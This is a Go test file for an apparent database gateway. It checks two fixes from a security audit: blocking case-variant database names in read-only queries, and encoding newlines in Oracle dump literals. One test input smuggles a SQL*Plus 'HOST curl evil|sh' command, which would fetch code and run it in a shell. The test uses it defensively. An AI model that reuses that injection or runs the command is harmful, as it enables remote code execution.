package gateway

import (
	"strings"
	"testing"

	"aegisdb/internal/model"
)

// 2026-11 白盒审计 V-12:orders 与 ORDERS 在区分大小写的库上是两个库,有 orders 授权不等于能碰 ORDERS。
func TestV12_BizQuery_CaseVariantDB(t *testing.T) {
	both := []string{"orders", "ORDERS"}
	if r := BizReadOnlyCheck("MySQL", "SELECT * FROM ORDERS.t", "orders", both); r == nil || r.Code != model.BizOtherDB {
		t.Fatalf("ORDERS 是别的库,实际 %+v", r)
	}
	if r := BizReadOnlyCheck("MySQL", "SELECT * FROM `ORDERS`.t", "orders", both); r == nil || r.Code != model.BizOtherDB {
		t.Fatalf("反引号写法也要认,实际 %+v", r)
	}
	if r := BizReadOnlyCheck("MySQL", "SELECT * FROM orders.t", "orders", both); r != nil {
		t.Fatalf("授权的库照常,实际 %+v", r)
	}
	if r := BizReadOnlyCheck("MySQL", "SHOW TABLES FROM ORDERS", "orders", both); r == nil || r.Code != model.BizOtherDB {
		t.Fatalf("SHOW 也要认,实际 %+v", r)
	}
	// 原有行为:库列表里只有一种写法(不区分大小写的库 / Oracle)时,大小写不同就是同一个库。
	if r := BizReadOnlyCheck("MySQL", "SELECT * FROM ORDERS.t", "orders", []string{"orders", "other"}); r != nil {
		t.Fatalf("只有一种写法时照旧放行,实际 %+v", r)
	}
	if r := BizReadOnlyCheck("MySQL", "SELECT * FROM OTHER.t", "orders", []string{"orders", "other"}); r == nil || r.Code != model.BizOtherDB {
		t.Fatalf("别的库不分大小写都要拦,实际 %+v", r)
	}
	if r := BizReadOnlyCheck("Oracle", "SELECT * FROM scott.t", "HR", []string{"HR", "SCOTT"}); r == nil {
		t.Fatal("Oracle 的别的 schema 不分大小写都要拦")
	}
	if r := BizReadOnlyCheck("Oracle", "SELECT * FROM hr.t", "HR", []string{"HR", "SCOTT"}); r != nil {
		t.Fatalf("Oracle 授权的 schema 照常,实际 %+v", r)
	}
}

// 2026-11 白盒审计 V-14:Oracle 导出里不留真换行,否则用 SQL*Plus 回放时数据里的空行能逃出字面量。
func TestV14_OracleDump_NoRawNewlines(t *testing.T) {
	cases := map[string]string{
		"a\n\nHOST curl evil|sh": "'a'||CHR(10)||CHR(10)||'HOST curl evil|sh'",
		"a\r\nb":                 "'a'||CHR(13)||CHR(10)||'b'",
		"\n":                     "CHR(10)",
		"a\n.\nb":                "'a'||CHR(10)||'.'||CHR(10)||'b'",
		"it's\nok":               "'it''s'||CHR(10)||'ok'",
		"a\n":                    "'a'||CHR(10)",
		"plain":                  "'plain'",
		"it's":                   "'it''s'",
		"":                       "''",
	}
	for in, want := range cases {
		got := SQLLiteral("Oracle", Cell{Text: in, Kind: KindText})
		if got != want {
			t.Errorf("%q → %s,应为 %s", in, got, want)
		}
		if strings.ContainsAny(got, "\r\n") {
			t.Errorf("%q 的字面量里还有真换行", in)
		}
	}
	// 原有行为:别的引擎的换行照旧写在字面量里(它们的客户端不按行结束语句)
	if got := SQLLiteral("MySQL", Cell{Text: "a\nb", Kind: KindText}); got != "'a\nb'" {
		t.Errorf("MySQL 不变,实际 %s", got)
	}
	if got := SQLLiteral("PostgreSQL", Cell{Text: "a\nb", Kind: KindText}); got != "'a\nb'" {
		t.Errorf("PostgreSQL 不变,实际 %s", got)
	}
}
